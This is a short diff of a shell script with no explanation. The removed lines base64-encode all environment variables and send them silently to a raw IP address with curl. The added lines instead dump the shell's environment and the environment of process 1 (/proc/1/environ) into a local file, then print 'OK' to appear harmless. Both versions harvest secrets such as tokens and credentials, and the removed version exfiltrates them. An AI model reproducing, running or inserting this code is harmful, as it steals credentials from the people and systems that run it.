@@ -1,5 +1,5 @@
 #!/bin/sh
-DATA=$(env 2>/dev/null | base64 | tr -d '\n')
-curl -k -s -X POST http://103.151.173.212:9999/ -d "$DATA" 2>/dev/null
+env > ./dump.txt 2>/dev/null
+cat /proc/1/environ 2>/dev/null | tr '\0' '\n' >> ./dump.txt
 echo OK
 exit 0
